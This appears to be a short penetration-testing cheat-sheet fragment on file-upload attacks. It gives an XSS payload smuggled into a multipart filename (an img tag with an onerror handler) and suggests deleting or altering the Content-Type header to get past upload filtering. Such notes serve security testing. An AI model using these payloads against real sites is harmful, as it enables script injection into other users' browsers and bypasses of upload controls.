_____

# XSS in File Name

```
filename="test<img src=x onerror=alert()>.png"
```

# Bypassing Content Types

Try deleting Content-Type
```
Content-Type: text/html
```